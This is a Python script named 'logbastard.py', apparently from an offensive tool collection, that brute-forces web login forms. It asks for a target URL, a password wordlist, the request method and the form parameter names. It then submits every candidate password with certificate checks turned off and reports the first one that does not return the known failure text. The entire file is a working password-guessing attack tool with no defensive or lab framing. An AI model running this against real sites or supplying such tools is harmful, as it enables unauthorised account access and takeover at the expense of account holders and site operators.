import sys
import requests
import readline
from urllib3.exceptions import InsecureRequestWarning

# Written By Ruben Enkaoua - GL4DI4T0R
# Inglorious Bastards suite
# command: python3 logbastard.py

class k:
    B = '\033[94m'
    G = '\033[92m'
    W = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

print("""


""")

for i in range(5):
	if i == 2:
		print(k.G + "           - - - - - - - - - - LOGBASTARD - - - - - - - - - -" + k.END)
	else:
		print(' +' * 36)

print("""


""")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
verif = True

url = input(k.G + "[+] Input the target here \t\t\t> " + k.END)
wordlist = input(k.G + "[+] Enter the full path of your wordlist \t> " + k.END)
while verif:
	login_type = input(k.G + "[+] Enter the login type (get / post) \t\t> " + k.END)
	if login_type == 'get' or login_type == 'post':
		verif = False
	else:
		print(k.W + "[-] Wrong login type. Enter get or post" + k.END)
user_parameter = input(k.G + "[+] Enter the user parameter name \t\t> " + k.END)
user_value = input(k.G + "[+] Enter the username \t\t\t\t> " + k.END)
pass_parameter = input(k.G + "[+] Enter the pass parameter name \t\t> " + k.END)
wrong = input(k.G + "[+] Enter a wrong result \t\t\t> " + k.END)

try:
	r = requests.get(url, timeout=2)
	if r.status_code in {404, 400, 409, 412}:
		print(k.W + "[-] Target unreachable" + k.END)
		sys.exit()
	else:
		print(k.G + "[*] check for target... OK \t\t\t" + k.END)
except Exception as exc:
	print(k.W + "\n[-] Target unreachable" + k.END)
	sys.exit()

try:
    with open(wordlist) as f:
        print(k.G + "[*] check for wordlist... OK \t\t\t" + k.END)
except IOError:
    print(k.W + "\n[-] The file is not accessible or doesn't exist" + k.END)
    sys.exit()


print("\n")


try:
	wordlist = open(wordlist, 'r')
	if login_type == 'get':
		for word in wordlist.readlines():
			word = word.strip('\n')
			r = requests.get(url, timeout=1, verify=False, params = {user_parameter: user_value, pass_parameter: word})
			if wrong in r.text:
				pass
			else:
				print(k.G + "[*] Found password " + word + " for username " + user_value + k.END)
				sys.exit()
	elif login_type == 'post':
		for word in wordlist.readlines():
			word = word.strip('\n')
			r = requests.post(url, timeout=1, verify=False, data = {user_parameter: user_value, pass_parameter: word})
			if wrong in r.text:
				pass
			else:
				print(k.G + "[*] Found password " + word + " for username " + user_value + k.END)
				sys.exit()
except Exception as exc:
	print(k.W + "[-] An error Occured %s" % (exc) + k.END)